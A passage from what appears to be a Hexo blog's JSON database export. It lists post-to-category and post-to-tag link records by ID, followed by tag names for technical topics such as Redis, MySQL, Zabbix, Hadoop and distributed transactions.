wtmaqwbh9p3","category_id":"ciwbruldr0044gwtmextxxqvu","_id":"ciwbrulek004pgwtmdleidj13"},{"post_id":"ciwbrule9004dgwtmmcz3td7m","category_id":"ciwbrulbw001xgwtmpk32r2ce","_id":"ciwbrulem004sgwtmog7axv5x"},{"post_id":"ciwbruleb004ggwtm1fv0cj2d","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbruleo004ugwtmduqwhgvi"},{"post_id":"ciwbruleh004kgwtmcw86d9vx","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrulep004xgwtmggh66cgs"},{"post_id":"ciwbrulej004ngwtmg4d9nqnz","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrules0050gwtmb98plg9d"},{"post_id":"ciwbrulel004rgwtmeoq65a8k","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbrulev0054gwtmch00xtrx"},{"post_id":"ciwbrulen004tgwtmj3w77m9m","category_id":"ciwbruldr0044gwtmextxxqvu","_id":"ciwbrulex0057gwtm8gkg3ro3"},{"post_id":"ciwbruleo004vgwtmjzexmi9d","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrulf2005agwtmc77lbgwc"},{"post_id":"ciwbruleq004zgwtmh0gj9tok","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbrulf4005dgwtmyifb4mwg"},{"post_id":"ciwbrulet0052gwtmaxcwnzo5","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulf7005ggwtm750y5p26"},{"post_id":"ciwbrulev0055gwtml6t57wva","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbrulfa005kgwtmag5yqo9j"},{"post_id":"ciwbrulex0058gwtmdj9w5gko","category_id":"ciwbrulbw001xgwtmpk32r2ce","_id":"ciwbrulfd005ogwtmjmrhrw9w"},{"post_id":"ciwbrulf3005bgwtmao3wnu8q","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulfe005qgwtmvfsrh73a"},{"post_id":"ciwbrulfb005lgwtm544mo75l","category_id":"ciwbruldr0044gwtmextxxqvu","_id":"ciwbrulff005sgwtmgnbifrza"},{"post_id":"ciwbrulf5005egwtmuy235knh","category_id":"ciwbrulfa005jgwtmgmbxgpzh","_id":"ciwbrulff005ugwtm65rxtda8"}],"PostTag":[{"post_id":"ciwbrul9w0001gwtm4148x45m","tag_id":"ciwbrula70005gwtms54lvt70","_id":"ciwbrulan000dgwtmcmwaqlip"},{"post_id":"ciwbrula40003gwtmxl0e201x","tag_id":"ciwbrulak000agwtmxzobyx8o","_id":"ciwbrulas000kgwtm7wsox7el"},{"post_id":"ciwbrulat000lgwtm0fz114qc","tag_id":"ciwbrula70005gwtms54lvt70","_id":"ciwbrulax000pgwtmv8laf38u"},{"post_id":"ciwbrulaa0007gwtmm3roawma","tag_id":"ciwbrular000hgwtmjpwhzxym","_id":"ciwbrulba0013gwtmw4us5jrp"},{"post_id":"ciwbrulaa0007gwtmm3roawma","tag_id":"ciwbrulaw000ogwtmdr40cwwq","_id":"ciwbrulbc0017gwtmicrlboaz"},{"post_id":"ciwbrulaa0007gwtmm3roawma","tag_id":"ciwbrulb4000vgwtm02y6olrr","_id":"ciwbrulbe001bgwtmr2dvpfyz"},{"post_id":"ciwbrulal000bgwtmc252k15c","tag_id":"ciwbrulb80011gwtmrrgkac1x","_id":"ciwbrulbn001kgwtmsxcueqxv"},{"post_id":"ciwbrulal000bgwtmc252k15c","tag_id":"ciwbrulbe001agwtm6vyo6h8q","_id":"ciwbrulbq001ngwtmzpmlvl52"},{"post_id":"ciwbrulao000egwtm9pfhc4qo","tag_id":"ciwbrulbi001hgwtmdn60jbyl","_id":"ciwbrulbs001rgwtm9ltwdiwt"},{"post_id":"ciwbrulaq000ggwtmkbjq7otk","tag_id":"ciwbrulbr001ogwtmmtfeefuw","_id":"ciwbrulc00024gwtmyzw5pr0r"},{"post_id":"ciwbrulaq000ggwtmkbjq7otk","tag_id":"ciwbrulbv001vgwtmat733s1t","_id":"ciwbrulc20027gwtmq3f1i8ii"},{"post_id":"ciwbrulav000ngwtmlspjcadd","tag_id":"ciwbrulbz0022gwtme0czmxyc","_id":"ciwbrulcc002cgwtmp3cbvzp0"},{"post_id":"ciwbrulb2000ugwtm4ubhlkip","tag_id":"ciwbrulc70029gwtmk2ifqak3","_id":"ciwbrulck002ngwtmz8dsugdq"},{"post_id":"ciwbrulb2000ugwtm4ubhlkip","tag_id":"ciwbrulcf002fgwtmmmj72xvh","_id":"ciwbrulcn002qgwtmrqdzi9fz"},{"post_id":"ciwbrulck002pgwtmg2ykrv21","tag_id":"ciwbrula70005gwtms54lvt70","_id":"ciwbrulcp002ugwtmkqoue446"},{"post_id":"ciwbrulb6000zgwtmp38ff9n6","tag_id":"ciwbrulci002lgwtmz5owukzn","_id":"ciwbrulcr002xgwtmyfmlepl4"},{"post_id":"ciwbrulb80012gwtmdb3yccep","tag_id":"ciwbrulco002tgwtmgdcs3nzw","_id":"ciwbrulcx0033gwtm580o60uy"},{"post_id":"ciwbrulcs002zgwtmbirk74rw","tag_id":"ciwbrulco002tgwtmgdcs3nzw","_id":"ciwbrulcz0036gwtmm0lw6wgt"},{"post_id":"ciwbrulbb0016gwtmci33yz9q","tag_id":"ciwbrulcu0030gwtmg934pcaq","_id":"ciwbruld2003agwtmt2isnunt"},{"post_id":"ciwbrulbd0019gwtmmo59zi59","tag_id":"ciwbruld00037gwtmhmkgqxvw","_id":"ciwbruld6003ggwtmr33rvi6p"},{"post_id":"ciwbrulbf001dgwtml0daa6pl","tag_id":"ciwbruld4003egwtmew0q198y","_id":"ciwbruldb003ngwtmv9xrcg6p"},{"post_id":"ciwbrulbh001ggwtm6p7nlgsm","tag_id":"ciwbrulda003lgwtmtbeznslm","_id":"ciwbruldp003zgwtmfkx9y8za"},{"post_id":"ciwbrulbh001ggwtm6p7nlgsm","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbruldq0042gwtm2c27zmx8"},{"post_id":"ciwbrulbj001jgwtmts5d66ve","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbruldu0047gwtmzp8ibddx"},{"post_id":"ciwbruldp0041gwtmzhy1py2v","tag_id":"ciwbrulbe001agwtm6vyo6h8q","_id":"ciwbruldw004agwtmmq1h3e8k"},{"post_id":"ciwbruldp0041gwtmzhy1py2v","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbrulea004egwtm3a9nxa47"},{"post_id":"ciwbrulbo001mgwtm0qq47k2c","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbrulee004hgwtmpth9clw3"},{"post_id":"ciwbrulbr001qgwtmdxksm6kc","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbrulei004lgwtmkvofufzu"},{"post_id":"ciwbruleh004kgwtmcw86d9vx","tag_id":"ciwbrulci002lgwtmz5owukzn","_id":"ciwbrulek004ogwtmfhkhtfsf"},{"post_id":"ciwbrulbt001tgwtmbb06as0l","tag_id":"ciwbrulef004igwtma71bm3sa","_id":"ciwbruleq004ygwtmrwy70gme"},{"post_id":"ciwbrulbt001tgwtmbb06as0l","tag_id":"ciwbrulek004qgwtmooqwpspx","_id":"ciwbrules0051gwtm0jmh8o6d"},{"post_id":"ciwbrulbv001wgwtmdpwjhxsf","tag_id":"ciwbrulep004wgwtmy8xbskef","_id":"ciwbrulex0056gwtmp5ierlu2"},{"post_id":"ciwbrulbx001zgwtm5nohdz3n","tag_id":"ciwbruleu0053gwtmglfzi0s3","_id":"ciwbrulf4005cgwtmaldmvobp"},{"post_id":"ciwbrulbz0021gwtm4awzx5sp","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbrulfa005igwtm89ak59r7"},{"post_id":"ciwbrulf5005egwtmuy235knh","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbrulfc005mgwtmvn464w6j"},{"post_id":"ciwbrulc10025gwtmcjqghqt6","tag_id":"ciwbrulci002lgwtmz5owukzn","_id":"ciwbrulfd005pgwtm1vvrturr"},{"post_id":"ciwbrulc50028gwtmjf51orgm","tag_id":"ciwbrulci002lgwtmz5owukzn","_id":"ciwbrulff005tgwtm5y2inc2w"},{"post_id":"ciwbrulc9002bgwtmgtagzgr6","tag_id":"ciwbrulci002lgwtmz5owukzn","_id":"ciwbrulfg005wgwtmbyg7z02w"},{"post_id":"ciwbrulcd002egwtmivimugdl","tag_id":"ciwbrulfg005vgwtmx2187isj","_id":"ciwbrulfh005ygwtmq7jwojrf"},{"post_id":"ciwbrulcf002hgwtmf3ox0ma9","tag_id":"ciwbrulfg005xgwtmjrdesg9c","_id":"ciwbrulfi0061gwtmzgyt7wxd"},{"post_id":"ciwbrulcf002hgwtmf3ox0ma9","tag_id":"ciwbrulfh005zgwtmycvmot4e","_id":"ciwbrulfi0062gwtmo2cwpt6x"},{"post_id":"ciwbrulcj002mgwtmx0me9x39","tag_id":"ciwbrulfh0060gwtm6k7i0d6t","_id":"ciwbrulfj0064gwtmgpmyqsi3"},{"post_id":"ciwbrulcn002sgwtm49trk5o4","tag_id":"ciwbrulco002tgwtmgdcs3nzw","_id":"ciwbrulfk0066gwtmz5z12z2c"},{"post_id":"ciwbrulcq002wgwtmudj9at01","tag_id":"ciwbrulfj0065gwtmzuibesrc","_id":"ciwbrulfk0068gwtm4w55hgrs"},{"post_id":"ciwbrulcw0032gwtmx3unfhm1","tag_id":"ciwbrulfk0067gwtm41kfmptb","_id":"ciwbrulfl006agwtmxowt6j4h"},{"post_id":"ciwbrulcy0035gwtmt1e06oot","tag_id":"ciwbrulfl0069gwtmlynosscf","_id":"ciwbrulfm006cgwtm8p0ck93f"},{"post_id":"ciwbruld3003cgwtmjuun421g","tag_id":"ciwbrulep004wgwtmy8xbskef","_id":"ciwbrulfo006egwtm2e6bei0u"},{"post_id":"ciwbruld4003fgwtmuo2vtla9","tag_id":"ciwbrulep004wgwtmy8xbskef","_id":"ciwbrulfp006hgwtmi00rpugh"},{"post_id":"ciwbruld4003fgwtmuo2vtla9","tag_id":"ciwbrulfo006fgwtmiwu1w11e","_id":"ciwbrulfq006igwtm604vep6v"},{"post_id":"ciwbruld6003igwtmlovemqag","tag_id":"ciwbrulep004wgwtmy8xbskef","_id":"ciwbrulfr006lgwtmdn7s8gba"},{"post_id":"ciwbruld6003igwtmlovemqag","tag_id":"ciwbruldh003rgwtm0xtlzonk","_id":"ciwbrulfs006mgwtmi30i6fll"},{"post_id":"ciwbruld9003kgwtmd8hepbv0","tag_id":"ciwbrulep004wgwtmy8xbskef","_id":"ciwbrulfs006ogwtmtdmy3dx0"},{"post_id":"ciwbruld9003kgwtmd8hepbv0","tag_id":"ciwbrulci002lgwtmz5owukzn","_id":"ciwbrulft006pgwtma8lu09jx"},{"post_id":"ciwbrulde003qgwtmoiahvos9","tag_id":"ciwbrulfs006ngwtmsy4e3lva","_id":"ciwbrulfv006tgwtm44eltihr"},{"post_id":"ciwbrulde003qgwtmoiahvos9","tag_id":"ciwbrulft006qgwtm27dgwsgz","_id":"ciwbrulfv006ugwtm75te4jo0"},{"post_id":"ciwbrulde003qgwtmoiahvos9","tag_id":"ciwbrulft006rgwtmodpy3lae","_id":"ciwbrulfw006wgwtmre0ls156"},{"post_id":"ciwbruldi003tgwtmnkky8zpw","tag_id":"ciwbruleu0053gwtmglfzi0s3","_id":"ciwbrulfw006xgwtmesnoabpk"},{"post_id":"ciwbruldl003vgwtmk319x8ol","tag_id":"ciwbrulfv006vgwtmvigs1h44","_id":"ciwbrulfz0070gwtmw8pentw9"},{"post_id":"ciwbruldl003vgwtmk319x8ol","tag_id":"ciwbrulfx006ygwtm4nnbr9qf","_id":"ciwbrulfz0071gwtmvlnk4mz8"},{"post_id":"ciwbruldn003ygwtmaqwbh9p3","tag_id":"ciwbrulfx006zgwtmbpmjhoxc","_id":"ciwbrulg30074gwtm8gf1egpx"},{"post_id":"ciwbruldn003ygwtmaqwbh9p3","tag_id":"ciwbrulfz0072gwtmq6k8cb8j","_id":"ciwbrulg30075gwtms7s2cq3p"},{"post_id":"ciwbrulds0046gwtmw3lrj9qq","tag_id":"ciwbrulg10073gwtm241p98yq","_id":"ciwbrulg40077gwtmwp1s9dq7"},{"post_id":"ciwbruldv0049gwtmiaeombj8","tag_id":"ciwbrulep004wgwtmy8xbskef","_id":"ciwbrulg50079gwtmerxee9h2"},{"post_id":"ciwbruleb004ggwtm1fv0cj2d","tag_id":"ciwbrulg50078gwtmrph258jv","_id":"ciwbrulg6007bgwtm8gw739d2"},{"post_id":"ciwbruleb004ggwtm1fv0cj2d","tag_id":"ciwbrulcf002fgwtmmmj72xvh","_id":"ciwbrulg7007cgwtmoxkkyum7"},{"post_id":"ciwbrulej004ngwtmg4d9nqnz","tag_id":"ciwbrulg6007agwtm7sbh7dl9","_id":"ciwbrulg7007egwtm55i4ddyj"},{"post_id":"ciwbrulel004rgwtmeoq65a8k","tag_id":"ciwbrulg7007dgwtmu1cdda4r","_id":"ciwbrulg8007ggwtmr4q5b4o7"},{"post_id":"ciwbruleq004zgwtmh0gj9tok","tag_id":"ciwbrulg8007fgwtm4nv6wnda","_id":"ciwbrulg9007igwtmva0my5ij"},{"post_id":"ciwbrulet0052gwtmaxcwnzo5","tag_id":"ciwbrulg9007hgwtmn0hhdhzk","_id":"ciwbrulga007kgwtm5g0ppxs1"},{"post_id":"ciwbrulex0058gwtmdj9w5gko","tag_id":"ciwbrulco002tgwtmgdcs3nzw","_id":"ciwbrulgb007mgwtmiv3iwium"},{"post_id":"ciwbrulex0058gwtmdj9w5gko","tag_id":"ciwbrulfk0067gwtm41kfmptb","_id":"ciwbrulgb007ngwtmohs7ci36"},{"post_id":"ciwbrulf3005bgwtmao3wnu8q","tag_id":"ciwbrulga007lgwtmjj3dm6h0","_id":"ciwbrulgc007pgwtm1okergmx"},{"post_id":"ciwbrulfb005lgwtm544mo75l","tag_id":"ciwbrulfx006zgwtmbpmjhoxc","_id":"ciwbrulge007rgwtm1opi4pgb"},{"post_id":"ciwbrulfb005lgwtm544mo75l","tag_id":"ciwbrulfz0072gwtmq6k8cb8j","_id":"ciwbrulgf007sgwtmsg621qlx"}],"Tag":[{"name":"concurrent","_id":"ciwbrula70005gwtms54lvt70"},{"name":"Swagger","_id":"ciwbrulak000agwtmxzobyx8o"},{"name":"CAP","_id":"ciwbrular000hgwtmjpwhzxym"},{"name":"BASE","_id":"ciwbrulaw000ogwtmdr40cwwq"},{"name":"ACID","_id":"ciwbrulb4000vgwtm02y6olrr"},{"name":"ES","_id":"ciwbrulb80011gwtmrrgkac1x"},{"name":"solr","_id":"ciwbrulbe001agwtm6vyo6h8q"},{"name":"Druid","_id":"ciwbrulbi001hgwtmdn60jbyl"},{"name":"github","_id":"ciwbrulbr001ogwtmmtfeefuw"},{"name":"hexo","_id":"ciwbrulbv001vgwtmat733s1t"},{"name":"JVM","_id":"ciwbrulbz0022gwtme0czmxyc"},{"name":"集合","_id":"ciwbrulc70029gwtmk2ifqak3"},{"name":"疑难杂症","_id":"ciwbrulcf002fgwtmmmj72xvh"},{"name":"redis","_id":"ciwbrulci002lgwtmz5owukzn"},{"name":"大数据","_id":"ciwbrulco002tgwtmgdcs3nzw"},{"name":"Maven","_id":"ciwbrulcu0030gwtmg934pcaq"},{"name":"Metrics","_id":"ciwbruld00037gwtmhmkgqxvw"},{"name":"MyBatis","_id":"ciwbruld4003egwtmew0q198y"},{"name":"atlas","_id":"ciwbrulda003lgwtmtbeznslm"},{"name":"mysql","_id":"ciwbruldh003rgwtm0xtlzonk"},{"name":"MySQL","_id":"ciwbrulef004igwtma71bm3sa"},{"name":"性能调优","_id":"ciwbrulek004qgwtmooqwpspx"},{"name":"zabbix","_id":"ciwbrulep004wgwtmy8xbskef"},{"name":"分布式算法","_id":"ciwbruleu0053gwtmglfzi0s3"},{"name":"tcp","_id":"ciwbrulfg005vgwtmx2187isj"},{"name":"sonar","_id":"ciwbrulfg005xgwtmjrdesg9c"},{"name":"jenkins","_id":"ciwbrulfh005zgwtmycvmot4e"},{"name":"VPSMate","_id":"ciwbrulfh0060gwtm6k7i0d6t"},{"name":"git","_id":"ciwbrulfj0065gwtmzuibesrc"},{"name":"hadoop","_id":"ciwbrulfk0067gwtm41kfmptb"},{"name":"jdk","_id":"ciwbrulfl0069gwtmlynosscf"},{"name":"nginx","_id":"ciwbrulfo006fgwtmiwu1w11e"},{"name":"分布式事务","_id":"ciwbrulfs006ngwtmsy4e3lva"},{"name":"2pc","_id":"ciwbrulft006qgwtm27dgwsgz"},{"name":"3pc","_id":"ciwbrulft006rgwtmodpy3lae"},{"name":"运维","_id":"ciwbrulfv006vgwtmvigs1h44"},{"name":"监控","_id":"ciwbrulfx006ygwtm4nnbr9qf"},{"name":"SonarQube","_id":"ciwbrulfx006zgwtmbpmjhoxc"},{"name":"设计模式","_id":"ciwbrulfz0072gwtmq6k8cb8j"},{"name":"HttpsDNS","_id":"ciwbrulg10073gwtm241p98yq"},{"name":"初始化块","_id":"ciwbrulg50078gwtmrph258jv"},{"name":"shiro","_id":"ciwbrulg6007agwtm7sbh7dl9"},{"name":"微信公众号","_id":"ciwbrulg7007dgwtmu1cdda4r"},{"name":"算法复杂度","_id":"ciwbrulg8007fgwtm4nv6wnda"},{"name":"线程池","_id":"ciwbrulg9007hgwtmn0hhdhzk"},{"name":"elk","_id":"ciwbrulga007lgwtmjj3dm6h0"}]}}